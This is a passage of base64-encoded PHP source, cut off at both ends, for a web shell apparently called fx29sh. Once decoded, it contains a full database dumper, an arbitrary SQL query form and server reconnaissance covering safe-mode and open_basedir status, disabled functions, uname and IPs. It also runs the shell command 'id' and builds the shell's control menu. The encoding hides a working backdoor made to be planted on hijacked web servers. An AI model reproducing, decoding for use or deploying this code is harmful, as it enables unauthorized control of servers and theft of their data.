AgIGlmICghZW1wdHkoJHNvcnQpKSB7c2V0Y29va2llKCJzb3J0Iiwkc29ydCk7fQogICAgaWYgKCFlbXB0eSgkc3FsX3NvcnQpKSB7c2V0Y29va2llKCJzcWxfc29ydCIsJHNxbF9zb3J0KTt9CiAgfQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRwd3VpZCIpIGFuZCAhaW5fYXJyYXkoInBvc2l4X2dldHB3dWlkIiwkZGlzYWJsZWZ1bmMpKSB7ZnVuY3Rpb24gcG9zaXhfZ2V0cHd1aWQoJHVpZCkge3JldHVybiBGQUxTRTt9fQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRncmdpZCIpIGFuZCAhaW5fYXJyYXkoInBvc2l4X2dldGdyZ2lkIiwkZGlzYWJsZWZ1bmMpKSB7ZnVuY3Rpb24gcG9zaXhfZ2V0Z3JnaWQoJGdpZCkge3JldHVybiBGQUxTRTt9fQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9raWxsIikgYW5kICFpbl9hcnJheSgicG9zaXhfa2lsbCIsJGRpc2FibGVmdW5jKSkge2Z1bmN0aW9uIHBvc2l4X2tpbGwoJGdpZCkge3JldHVybiBGQUxTRTt9fQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJteXNxbF9kdW1wIikpIHsKICAgIGZ1bmN0aW9uIG15c3FsX2R1bXAoJHNldCkgewogICAgICBnbG9iYWwgJHNoX3ZlcjsKICAgICAgJHNvY2sgPSAkc2V0WyJzb2NrIl07CiAgICAgICRkYiA9ICRzZXRbImRiIl07CiAgICAgICRwcmludCA9ICRzZXRbInByaW50Il07CiAgICAgICRubDJiciA9ICRzZXRbIm5sMmJyIl07CiAgICAgICRmaWxlID0gJHNldFsiZmlsZSJdOwogICAgICAkYWRkX2Ryb3AgPSAkc2V0WyJhZGRfZHJvcCJdOwogICAgICAkdGFicyA9ICRzZXRbInRhYnMiXTsKICAgICAgJG9ubHl0YWJzID0gJHNldFsib25seXRhYnMiXTsKICAgICAgJHJldCA9IGFycmF5KCk7CiAgICAgICRyZXRbImVyciJdID0gYXJyYXkoKTsKICAgICAgaWYgKCFpc19yZXNvdXJjZSgkc29jaykpIHtlY2hvKCJFcnJvcjogXCRzb2NrIGlzIG5vdCB2YWxpZCByZXNvdXJjZS4iKTt9CiAgICAgIGlmIChlbXB0eSgkZGIpKSB7JGRiID0gImRiIjt9CiAgICAgIGlmIChlbXB0eSgkcHJpbnQpKSB7JHByaW50ID0gMDt9CiAgICAgIGlmIChlbXB0eSgkbmwyYnIpKSB7JG5sMmJyID0gMDt9CiAgICAgIGlmIChlbXB0eSgkYWRkX2Ryb3ApKSB7JGFkZF9kcm9wID0gVFJVRTt9CiAgICAgIGlmIChlbXB0eSgkZmlsZSkpIHsKICAgICAgICAkZmlsZSA9ICR0bXBkaXIuImR1bXBfIi5nZXRlbnYoIlNFUlZFUl9OQU1FIikuIl8iLiRkYi4iXyIuZGF0ZSgiZC1tLVktSC1pLXMiKS4iLnNxbCI7CiAgICAgIH0KICAgICAgaWYgKCFpc19hcnJheSgkdGFicykpIHskdGFicyA9IGFycmF5KCk7fQogICAgICBpZiAoZW1wdHkoJGFkZF9kcm9wKSkgeyRhZGRfZHJvcCA9IFRSVUU7fQogICAgICBpZiAoc2l6ZW9mKCR0YWJzKSA9PSAwKSB7CiAgICAgICAgLy9SZXRyaWV2ZSB0YWJsZXMtbGlzdAogICAgICAgICRyZXMgPSBteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMgRlJPTSAiLiRkYiwgJHNvY2spOwogICAgICAgIGlmIChteXNxbF9udW1fcm93cygkcmVzKSA+IDApIHt3aGlsZSAoJHJvdyA9IG15c3FsX2ZldGNoX3JvdygkcmVzKSkgeyR0YWJzW10gPSAkcm93WzBdO319CiAgICAgIH0KICAgICAgJG91dCA9ICIKICAgICAgIyBEdW1wZWQgYnkgIi4kc2hfbmFtZS4iCiAgICAgICMKICAgICAgIyBIb3N0IHNldHRpbmdzOgogICAgICAjIE15U1FMIHZlcnNpb246ICgiLm15c3FsX2dldF9zZXJ2ZXJfaW5mbygpLiIpIHJ1bm5pbmcgb24gIi5nZXRlbnYoIlNFUlZFUl9BRERSIikuIiAoIi5nZXRlbnYoIlNFUlZFUl9OQU1FIikuIikiLiIKICAgICAgIyBEYXRlOiAiLmRhdGUoImQubS5ZIEg6aTpzIikuIgogICAgICAjIERCOiBcIiIuJGRiLiJcIgogICAgICAjLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIjsKICAgICAgJGMgPSBjb3VudCgkb25seXRhYnMpOwogICAgICBmb3JlYWNoKCR0YWJzIGFzICR0YWIpIHsKICAgICAgICBpZiAoKGluX2FycmF5KCR0YWIsJG9ubHl0YWJzKSkgb3IgKCEkYykpIHsKICAgICAgICAgIGlmICgkYWRkX2Ryb3ApIHskb3V0IC49ICJEUk9QIFRBQkxFIElGIEVYSVNUUyBgIi4kdGFiLiJgO1xuIjt9CiAgICAgICAgICAvL1JlY2VpZXZlIHF1ZXJ5IGZvciBjcmVhdGUgdGFibGUgc3RydWN0dXJlCiAgICAgICAgICAkcmVzID0gbXlzcWxfcXVlcnkoIlNIT1cgQ1JFQVRFIFRBQkxFIGAiLiR0YWIuImAiLCAkc29jayk7CiAgICAgICAgICBpZiAoISRyZXMpIHskcmV0WyJlcnIiXVtdID0gbXlzcWxfc21hcnRlcnJvcigpO30KICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAkcm93ID0gbXlzcWxfZmV0Y2hfcm93KCRyZXMpOwogICAgICAgICAgICAkb3V0IC49ICRyb3dbIjEiXS4iO1xuXG4iOwogICAgICAgICAgICAvL1JlY2VpZXZlIHRhYmxlIHZhcmlhYmxlcwogICAgICAgICAgICAkcmVzID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIEZST00gYCR0YWJgIiwgJHNvY2spOwogICAgICAgICAgICBpZiAobXlzcWxfbnVtX3Jvd3MoJHJlcykgPiAwKSB7CiAgICAgICAgICAgICAgd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hc3NvYygkcmVzKSkgewogICAgICAgICAgICAgICAgJGtleXMgPSBpbXBsb2RlKCJgLCBgIiwgYXJyYXlfa2V5cygkcm93KSk7CiAgICAgICAgICAgICAgICAkdmFsdWVzID0gYXJyYXlfdmFsdWVzKCRyb3cpOwogICAgICAgICAgICAgICAgZm9yZWFjaCgkdmFsdWVzIGFzICRrPT4kdikgeyR2YWx1ZXNbJGtdID0gYWRkc2xhc2hlcygkdik7fQogICAgICAgICAgICAgICAgJHZhbHVlcyA9IGltcGxvZGUoIicsICciLCAkdmFsdWVzKTsKICAgICAgICAgICAgICAgICRzcWwgPSAiSU5TRVJUIElOVE8gYCR0YWJgKGAiLiRrZXlzLiJgKSBWQUxVRVMgKCciLiR2YWx1ZXMuIicpO1xuIjsKICAgICAgICAgICAgICAgICRvdXQgLj0gJHNxbDsKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgICAgJG91dCAuPSAiIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG4iOwogICAgICBpZiAoJGZpbGUpIHsKICAgICAgICAkZnAgPSBmb3BlbigkZmlsZSwgInciKTsKICAgICAgICBpZiAoISRmcCkgeyRyZXRbImVyciJdW10gPSAyO30KICAgICAgICBlbHNlIHsKICAgICAgICAgIGZ3cml0ZSAoJGZwLCAkb3V0KTsKICAgICAgICAgIGZjbG9zZSAoJGZwKTsKICAgICAgICB9CiAgICAgIH0KICAgICAgaWYgKCRwcmludCkge2lmICgkbmwyYnIpIHtlY2hvIG5sMmJyKCRvdXQpO30gZWxzZSB7ZWNobyAkb3V0O319CiAgICAgIHJldHVybiAkb3V0OwogICAgfQogIH0KICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygibXlzcWxfYnVpbGR3aGVyZSIpKSB7CiAgICBmdW5jdGlvbiBteXNxbF9idWlsZHdoZXJlKCRhcnJheSwkc2VwPSIgYW5kIiwkZnVuY3RzPWFycmF5KCkpIHsKICAgICAgaWYgKCFpc19hcnJheSgkYXJyYXkpKSB7JGFycmF5ID0gYXJyYXkoKTt9CiAgICAgICRyZXN1bHQgPSAiIjsKICAgICAgZm9yZWFjaCgkYXJyYXkgYXMgJGs9PiR2KSB7CiAgICAgICAgJHZhbHVlID0gIiI7CiAgICAgICAgaWYgKCFlbXB0eSgkZnVuY3RzWyRrXSkpIHskdmFsdWUgLj0gJGZ1bmN0c1ska10uIigiO30KICAgICAgICAkdmFsdWUgLj0gIiciLmFkZHNsYXNoZXMoJHYpLiInIjsKICAgICAgICBpZiAoIWVtcHR5KCRmdW5jdHNbJGtdKSkgeyR2YWx1ZSAuPSAiKSI7fQogICAgICAgICRyZXN1bHQgLj0gImAiLiRrLiJgID0gIi4kdmFsdWUuJHNlcDsKICAgICAgfQogICAgICAkcmVzdWx0ID0gc3Vic3RyKCRyZXN1bHQsMCxzdHJsZW4oJHJlc3VsdCktc3RybGVuKCRzZXApKTsKICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CiAgfQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJteXNxbF9mZXRjaF9hbGwiKSkgewogICAgZnVuY3Rpb24gbXlzcWxfZmV0Y2hfYWxsKCRxdWVyeSwkc29jaykgewogICAgICBpZiAoJHNvY2spIHskcmVzdWx0ID0gbXlzcWxfcXVlcnkoJHF1ZXJ5LCRzb2NrKTt9CiAgICAgIGVsc2UgeyRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnkpO30KICAgICAgJGFycmF5ID0gYXJyYXkoKTsKICAgICAgd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgeyRhcnJheVtdID0gJHJvdzt9CiAgICAgIG15c3FsX2ZyZWVfcmVzdWx0KCRyZXN1bHQpOwogICAgICByZXR1cm4gJGFycmF5OwogICAgfQogIH0KICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygibXlzcWxfc21hcnRlcnJvciIpKSB7CiAgICBmdW5jdGlvbiBteXNxbF9zbWFydGVycm9yKCR0eXBlLCRzb2NrKSB7CiAgICAgIGlmICgkc29jaykgeyRlcnJvciA9IG15c3FsX2Vycm9yKCRzb2NrKTt9CiAgICAgIGVsc2UgeyRlcnJvciA9IG15c3FsX2Vycm9yKCk7fQogICAgICAkZXJyb3IgPSBodG1sc3BlY2lhbGNoYXJzKCRlcnJvcik7CiAgICAgIHJldHVybiAkZXJyb3I7CiAgICB9CiAgfQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJteXNxbF9xdWVyeV9mb3JtIikpIHsKICAgIGZ1bmN0aW9uIG15c3FsX3F1ZXJ5X2Zvcm0oKSB7CiAgICAgIGdsb2JhbCAkc3VibWl0LCRzcWxfYWN0LCRzcWxfcXVlcnksJHNxbF9xdWVyeV9yZXN1bHQsJHNxbF9jb25maXJtLCRzcWxfcXVlcnlfZXJyb3IsJHRibF9zdHJ1Y3Q7CiAgICAgIGlmICgoJHN1Ym1pdCkgYW5kICghJHNxbF9xdWVyeV9yZXN1bHQpIGFuZCAoJHNxbF9jb25maXJtKSkge2lmICghJHNxbF9xdWVyeV9lcnJvcikgeyRzcWxfcXVlcnlfZXJyb3IgPSAiUXVlcnkgd2FzIGVtcHR5Ijt9IGVjaG8gIjxiPkVycm9yOjwvYj4gPGJyPiIuJHNxbF9xdWVyeV9lcnJvci4iPGJyPiI7fQogICAgICBpZiAoJHNxbF9xdWVyeV9yZXN1bHQgb3IgKCEkc3FsX2NvbmZpcm0pKSB7JHNxbF9hY3QgPSAkc3FsX2dvdG87fQogICAgICBpZiAoKCEkc3VibWl0KSBvciAoJHNxbF9hY3QpKSB7CiAgICAgICAgZWNobyAiPHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbmFtZT1cImZ4MjlzaF9zcWxxdWVyeVwiIG1ldGhvZD1QT1NUPjxiPiI7IGlmICgoJHNxbF9xdWVyeSkgYW5kICghJHN1Ym1pdCkpIHtlY2hvICJEbyB5b3UgcmVhbGx5IHdhbnQgdG8iO30gZWxzZSB7ZWNobyAiU1FMLVF1ZXJ5Ijt9IGVjaG8gIjo8L2I+PGJyPjxicj48dGV4dGFyZWEgbmFtZT1zcWxfcXVlcnkgY29scz0xMDAgcm93cz0xMD4iLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9xdWVyeSkuIjwvdGV4dGFyZWE+PGJyPjxicj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9c3FsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXNxbF9hY3QgdmFsdWU9cXVlcnk+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9c3FsX3RibCB2YWx1ZT1cIiIuaHRtbHNwZWNpYWxjaGFycygkc3FsX3RibCkuIlwiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXN1Ym1pdCB2YWx1ZT1cIjFcIj48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1cInNxbF9nb3RvXCIgdmFsdWU9XCIiLmh0bWxzcGVjaWFsY2hhcnMoJHNxbF9nb3RvKS4iXCI+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9c3FsX2NvbmZpcm0gdmFsdWU9XCJZZXNcIj4gPGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPVwiTm9cIj48L2Zvcm0+PC90ZD4iOwogICAgICAgIGlmICgkdGJsX3N0cnVjdCkgewogICAgICAgICAgZWNobyAiPHRkIHZhbGlnbj1cInRvcFwiPjxiPkZpZWxkczo8L2I+PGJyPiI7CiAgICAgICAgICBmb3JlYWNoICgkdGJsX3N0cnVjdCBhcyAkZmllbGQpIHskbmFtZSA9ICRmaWVsZFsiRmllbGQiXTsgZWNobyAiKyA8YSBocmVmPVwiI1wiIG9uY2xpY2s9XCJkb2N1bWVudC5meDI5c2hfc3FscXVlcnkuc3FsX3F1ZXJ5LnZhbHVlKz0nYCIuJG5hbWUuImAnO1wiPjxiPiIuJG5hbWUuIjwvYj48L2E+PGJyPiI7fQogICAgICAgICAgZWNobyAiPC90ZD48L3RyPjwvdGFibGU+IjsKICAgICAgICB9CiAgICAgIH0KICAgICAgaWYgKCRzcWxfcXVlcnlfcmVzdWx0IG9yICghJHNxbF9jb25maXJtKSkgeyRzcWxfcXVlcnkgPSAkc3FsX2xhc3RfcXVlcnk7fQogICAgfQogIH0KICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygibXlzcWxfY3JlYXRlX2RiIikpIHsKICAgIGZ1bmN0aW9uIG15c3FsX2NyZWF0ZV9kYigkZGIsJHNvY2s9IiIpIHsKICAgICAgJHNxbCA9ICJDUkVBVEUgREFUQUJBU0UgYCIuYWRkc2xhc2hlcygkZGIpLiJgOyI7CiAgICAgIGlmICgkc29jaykge3JldHVybiBteXNxbF9xdWVyeSgkc3FsLCRzb2NrKTt9CiAgICAgIGVsc2Uge3JldHVybiBteXNxbF9xdWVyeSgkc3FsKTt9CiAgICB9CiAgfQogIGlmICghZnVuY3Rpb25fZXhpc3RzKCJteXNxbF9xdWVyeV9wYXJzZSIpKSB7CiAgICBmdW5jdGlvbiBteXNxbF9xdWVyeV9wYXJzZSgkcXVlcnkpIHsKICAgICAgJHF1ZXJ5ID0gdHJpbSgkcXVlcnkpOwogICAgICAkYXJyID0gZXhwbG9kZSAoIiAiLCRxdWVyeSk7CiAgICAgICR0eXBlcyA9IGFycmF5KAogICAgICAgICJTRUxFQ1QiPT5hcnJheSgzLDEpLAogICAgICAgICJTSE9XIj0+YXJyYXkoMiwxKSwKICAgICAgICAiREVMRVRFIj0+YXJyYXkoMSksCiAgICAgICAgIkRST1AiPT5hcnJheSgxKQogICAgICApOwogICAgICAkcmVzdWx0ID0gYXJyYXkoKTsKICAgICAgJG9wID0gc3RydG91cHBlcigkYXJyWzBdKTsKICAgICAgaWYgKGlzX2FycmF5KCR0eXBlc1skb3BdKSkgewogICAgICAgICRyZXN1bHRbInByb3BlcnRpb25zIl0gPSAkdHlwZXNbJG9wXTsKICAgICAgICAkcmVzdWx0WyJxdWVyeSJdICA9ICRxdWVyeTsKICAgICAgICBpZiAoJHR5cGVzWyRvcF0gPT0gMikgewogICAgICAgICAgZm9yZWFjaCgkYXJyIGFzICRrPT4kdikgewogICAgICAgICAgICBpZiAoc3RydG91cHBlcigkdikgPT0gIkxJTUlUIikgewogICAgICAgICAgICAgICRyZXN1bHRbImxpbWl0Il0gPSAkYXJyWyRrKzFdOwogICAgICAgICAgICAgICRyZXN1bHRbImxpbWl0Il0gPSBleHBsb2RlKCIsIiwkcmVzdWx0WyJsaW1pdCJdKTsKICAgICAgICAgICAgICBpZiAoY291bnQoJHJlc3VsdFsibGltaXQiXSkgPT0gMSkgeyRyZXN1bHRbImxpbWl0Il0gPSBhcnJheSgwLCRyZXN1bHRbImxpbWl0Il1bMF0pO30KICAgICAgICAgICAgICB1bnNldCgkYXJyWyRrXSwkYXJyWyRrKzFdKTsKICAgICAgICAgICAgfQogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgICBlbHNlIHtyZXR1cm4gRkFMU0U7fQogICAgfQogIH0KICBpZiAoJGFjdCA9PSAiZ29maWxlIikgewogICAgaWYgKGlzX2RpcigkZikpIHsgJGFjdCA9ICJscyI7ICRkID0gJGY7IH0KICAgIGVsc2UgeyAkYWN0ID0gImYiOyAkZCA9IGRpcm5hbWUoJGYpOyAkZiA9IGJhc2VuYW1lKCRmKTsgfQogIH0KICAjIyBIRUFERVJTICMjCiAgQG9iX3N0YXJ0KCk7CiAgQG9iX2ltcGxpY2l0X2ZsdXNoKDApOwogIGhlYWRlcigiRXhwaXJlczogTW9uLCAyNiBKdWwgMTk5NyAwNTowMDowMCBHTVQiKTsKICBoZWFkZXIoIkxhc3QtTW9kaWZpZWQ6ICIuZ21kYXRlKCJELCBkIE0gWSBIOmk6cyIpLiIgR01UIik7CiAgaGVhZGVyKCJDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZSIpOwogIGhlYWRlcigiQ2FjaGUtQ29udHJvbDogcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCIsIEZBTFNFKTsKICBoZWFkZXIoIlByYWdtYTogbm8tY2FjaGUiKTsKICBpZiAoZW1wdHkoJHRtcGRpcikpIHsKICAgICR0bXBkaXIgPSBpbmlfZ2V0KCJ1cGxvYWRfdG1wX2RpciIpOwogICAgaWYgKGlzX2RpcigkdG1wZGlyKSkgeyR0bXBkaXIgPSAiL3RtcC8iO30KICB9CiAgJHRtcGRpciA9IHJlYWxwYXRoKCR0bXBkaXIpOwogICR0bXBkaXIgPSBzdHJfcmVwbGFjZSgiXFwiLERJUkVDVE9SWV9TRVBBUkFUT1IsJHRtcGRpcik7CiAgaWYgKHN1YnN0cigkdG1wZGlyLC0xKSAhPSBESVJFQ1RPUllfU0VQQVJBVE9SKSB7JHRtcGRpciAuPSBESVJFQ1RPUllfU0VQQVJBVE9SO30KICBpZiAoZW1wdHkoJHRtcGRpcl9sb2dzKSkgeyR0bXBkaXJfbG9ncyA9ICR0bXBkaXI7fQogIGVsc2UgeyR0bXBkaXJfbG9ncyA9IHJlYWxwYXRoKCR0bXBkaXJfbG9ncyk7fQogICRzb3J0ID0gaHRtbHNwZWNpYWxjaGFycygkc29ydCk7CiAgaWYgKGVtcHR5KCRzb3J0KSkgeyRzb3J0ID0gJHNvcnRfZGVmYXVsdDt9CiAgJHNvcnRbMV0gPSBzdHJ0b2xvd2VyKCRzb3J0WzFdKTsKICAkRElTUF9TRVJWRVJfU09GVFdBUkUgPSBnZXRlbnYoIlNFUlZFUl9TT0ZUV0FSRSIpOwogIGlmICghZXJlZygiUEhQLyIucGhwdmVyc2lvbigpLCRESVNQX1NFUlZFUl9TT0ZUV0FSRSkpIHskRElTUF9TRVJWRVJfU09GVFdBUkUgLj0gIi4gUEhQLyIucGhwdmVyc2lvbigpO30KICAkRElTUF9TRVJWRVJfU09GVFdBUkUgPSBzdHJfcmVwbGFjZSgiUEhQLyIucGhwdmVyc2lvbigpLCI8YSBocmVmPVwiIi4kc3VybC4iYWN0PXBocGluZm9cIiB0YXJnZXQ9XCJfYmxhbmtcIj48Yj48dT5QSFAvIi5waHB2ZXJzaW9uKCkuIjwvdT48L2I+PC9hPiIsaHRtbHNwZWNpYWxjaGFycygkRElTUF9TRVJWRVJfU09GVFdBUkUpKTsKICBAaW5pX3NldCgiaGlnaGxpZ2h0LmJnIiwkaGlnaGxpZ2h0X2JnKTsKICBAaW5pX3NldCgiaGlnaGxpZ2h0LmNvbW1lbnQiLCRoaWdobGlnaHRfY29tbWVudCk7CiAgQGluaV9zZXQoImhpZ2hsaWdodC5kZWZhdWx0IiwkaGlnaGxpZ2h0X2RlZmF1bHQpOwogIEBpbmlfc2V0KCJoaWdobGlnaHQuaHRtbCIsJGhpZ2hsaWdodF9odG1sKTsKICBAaW5pX3NldCgiaGlnaGxpZ2h0LmtleXdvcmQiLCRoaWdobGlnaHRfa2V5d29yZCk7CiAgQGluaV9zZXQoImhpZ2hsaWdodC5zdHJpbmciLCRoaWdobGlnaHRfc3RyaW5nKTsKICBpZiAoIWlzX2FycmF5KCRhY3Rib3gpKSB7ICRhY3Rib3ggPSBhcnJheSgpOyB9CiAgJGRzcGFjdCA9ICRhY3QgPSBodG1sc3BlY2lhbGNoYXJzKCRhY3QpOwogICRkaXNwX2Z1bGxwYXRoID0gJGxzX2FyciA9ICRub3RscyA9IG51bGw7CiAgJHVkID0gQHVybGVuY29kZSgkZCk7CiAgaWYgKGVtcHR5KCRkKSkgeyRkID0gcmVhbHBhdGgoIi4iKTt9CiAgZWxzZWlmKHJlYWxwYXRoKCRkKSkgeyRkID0gcmVhbHBhdGgoJGQpO30KICAkZCA9IHN0cl9yZXBsYWNlKCJcXCIsRElSRUNUT1JZX1NFUEFSQVRPUiwkZCk7CiAgaWYgKHN1YnN0cigkZCwtMSkgIT0gRElSRUNUT1JZX1NFUEFSQVRPUikgeyRkIC49IERJUkVDVE9SWV9TRVBBUkFUT1I7fQogICRkID0gc3RyX3JlcGxhY2UoIlxcXFwiLCJcXCIsJGQpOwogICRkaXNwZCA9IGh0bWxzcGVjaWFsY2hhcnMoJGQpOwogICRzYWZlbW9kZSA9IHNhZmVtb2RlKCk7CiAgaWYgKCRzYWZlbW9kZSkgewogICAgJGhzYWZlbW9kZSA9ICI8Zm9udCBjb2xvcj0jMzM2NkZGPjxiPlNBRkUgTU9ERSBJUyBPTjwvYj48L2ZvbnQ+IjsKICAgICRzYWZlbW9kZWV4ZWNkaXIgPSBAaW5pX2dldCgic2FmZV9tb2RlX2V4ZWNfZGlyIik7CiAgfQogIGVsc2UgeyAkaHNhZmVtb2RlID0gIjxmb250IGNvbG9yPSNGRjk5MDA+PGI+U0FGRSBNT0RFIElTIE9GRjwvYj48L2ZvbnQ+IjsgfQogICR2ID0gQGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOwogIGlmICgkdiBvciBzdHJ0b2xvd2VyKCR2KSA9PSAib24iKSB7CiAgICAkb3BlbmJhc2VkaXIgPSBUUlVFOwogICAgJGhvcGVuYmFzZWRpciA9ICI8Zm9udCBjb2xvcj1yZWQ+Ii4kdi4iPC9mb250PiI7CiAgfQogIGVsc2UgewogICAgJG9wZW5iYXNlZGlyID0gRkFMU0U7CiAgICAkaG9wZW5iYXNlZGlyID0gIjxmb250IGNvbG9yPWdyZWVuPk9GRiAobm90IHNlY3VyZSk8L2ZvbnQ+IjsKICB9CiAgCiMjIyMjIyMjIyMjIyMjIyMjIwojI1sgSFRNTCBTVEFSVCBdIyMKIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIHNydl9pbmZvKCR0aXRsZSwkY29udGVudHMpIHsKICBlY2hvICI8dHI+PHRoPiR0aXRsZTwvdGg+PHRkPjo8L3RkPjx0ZD4kY29udGVudHM8L3RkPjwvdHI+XG4iOwp9CmVjaG8gaHRtbGhlYWQoJGhzYWZlbW9kZSk7CmVjaG8gIjx0YWJsZSBpZD1wYWdlYmFyPiI7CmVjaG8gIjx0cj48dGQgY29sc3Bhbj0yPlxuIjsKZWNobyAiPGRpdiBjbGFzcz1mbGVmdD4kaHNhZmVtb2RlPC9kaXY+XG4iOwplY2hvICI8ZGl2IGNsYXNzPWZyaWdodD4iOwplY2hvICJJUCBBZGRyZXNzOiA8YSBocmVmPVwiaHR0cDovL3dzLmFyaW4ubmV0L2NnaS1iaW4vd2hvaXMucGw/cXVlcnlpbnB1dD0iLkBnZXRob3N0YnluYW1lKCRfU0VSVkVSWyJIVFRQX0hPU1QiXSkuIlwiPiIuQGdldGhvc3RieW5hbWUoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKS4iPC9hPiAiLgogICAgICJZb3U6IDxhIGhyZWY9XCJodHRwOi8vd3MuYXJpbi5uZXQvY2dpLWJpbi93aG9pcy5wbD9xdWVyeWlucHV0PSIuJF9TRVJWRVJbIlJFTU9URV9BRERSIl0uIlwiPiIuJF9TRVJWRVJbIlJFTU9URV9BRERSIl0uIjwvYT4gIi4KICAgICAoJHdpbj8iRHJpdmVzOiAiLmRpc3BfZHJpdmVzKCRkLCRzdXJsKToiIik7CmVjaG8gIjwvZGl2PlxuPC90ZD48L3RyPlxuIjsKZWNobyAiPHRyPjx0ZCB3aWR0aD01MCU+XG4iOwplY2hvICI8dGFibGUgY2xhc3M9aW5mbz5cbiI7CnNydl9pbmZvKCJTb2Z0d2FyZSIsIiIuJERJU1BfU0VSVkVSX1NPRlRXQVJFKTsKc3J2X2luZm8oIlVuYW1lIixwaHBfdW5hbWUoKSk7CnNydl9pbmZvKCJVc2VyIiwoJHdpbikgPyBnZXRfY3VycmVudF91c2VyKCkuIiAodWlkPSIuZ2V0bXl1aWQoKS4iIGdpZD0iLmdldG15Z2lkKCkuIikiIDogZngyOWV4ZWMoImlkIikpOwplY2hvICI8L3RhYmxlPjwvdGQ+XG4iLgogICAgICI8dGQgd2lkdGg9NTAlPlxuIjsKZWNobyAiPHRhYmxlIGNsYXNzPWluZm8+XG4iOwpzcnZfaW5mbygiRnJlZXNwYWNlIixkaXNwX2ZyZWVzcGFjZSgkZCkpOwplY2hvICI8L3RhYmxlPjwvdGQ+PC90cj5cbiI7CmVjaG8gIjx0cj48dGQgY29sc3Bhbj0yPlxuIjsKZWNobyBnZXRfc3RhdHVzKCk7CmVjaG8gIjwvdGQ+PC90cj5cbiI7CmVjaG8gIjx0cj48dGQgY29sc3Bhbj0yPlxuIjsKZWNobyAkc2FmZW1vZGVleGVjZGlyID8gIlNhZmVtb2RlRXhlY0RpcjogIi4kc2FmZW1vZGVleGVjZGlyLiI8YnI+XG4iIDogIiI7CmVjaG8gc2hvd2Rpc2Z1bmMoKSA/ICJEaXNGdW5jOiAiLnNob3dkaXNmdW5jKCkuIlxuIiA6ICIiOwplY2hvICI8L3RkPjwvdHI+XG4iOwplY2hvICI8dHI+PHRkIGNvbHNwYW49MiBpZD1tYWlubWVudT5cbiI7CmlmIChjb3VudCgkcXVpY2tsYXVuY2gyKSA+IDApIHsKICBmb3JlYWNoKCRxdWlja2xhdW5jaDIgYXMgJGl0ZW0pIHsKICAgICRpdGVtWzFdID0gc3RyX3JlcGxhY2UoIiVkIix1cmxlbmNvZGUoJGQpLCRpdGVtWzFdKTsKICAgICRpdGVtWzFdID0gc3RyX3JlcGxhY2UoIiVzb3J0Iiwkc29ydCwkaXRlbVsxXSk7CiAgICAkdiA9IHJlYWxwYXRoKCRkLiIuLiIpOwogICAgaWYgKGVtcHR5KCR2KSkgewogICAgICAkYSA9IGV4cGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwkZCk7CiAgICAgIHVuc2V0KCRhW2NvdW50KCRhKS0yXSk7CiAgICAgICR2ID0gam9pbihESVJFQ1RPUllfU0VQQVJBVE9SLCRhKTsKICAgIH0KICAgICRpdGVtWzFdID0gc3RyX3JlcGxhY2UoIiV1cGQiLHVybGVuY29kZSgkdiksJGl0ZW1bMV0pOwogICAgZWNobyAiPGEgaHJlZj1cIiIuJGl0ZW1bMV0uIlwiPiIuJGl0ZW1bMF0uIjwvYT5cbiI7CiAgfQp9CmVjaG8gIjwvdGQ+XG4iLgogICAgICI8dHI+PHRkIGNvbHNwYW49MiBpZD1tYWlubWVudT5cbiI7CmlmIChjb3VudCgkcXVpY2tsYXVuY2gxKSA+IDApIHsKICBmb3JlYWNoKCRxdWlja2xhdW5jaDEgYXMgJGl0ZW0pIHsKICAgICRpdGVtWzFdID0gc3RyX3JlcGxhY2UoIiVkIix1cmxlbmNvZGUoJGQpLCRpdGVtWzFdKTsKICAgICRpdGVtWzFdID0gc3RyX3JlcGxhY2UoIiVzb3J0Iiwkc29ydCwkaXRlbVsxXSk7CiAgICAkdiA9IHJlYWxwYXRoKCRkLiIuLiIpOwogICAgaWYgKGVtcHR5KCR2KSkgewogICAgICAkYSA9IGV4cGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwkZCk7CiAgICAgIHVuc2V0KCRhW2NvdW50KCRhKS0yXSk7CiAgICAgICR2ID0gam9pbihESVJFQ1RPUllfU0VQQVJBVE9SLCRhKTsKICAgIH0KICAgICRpdG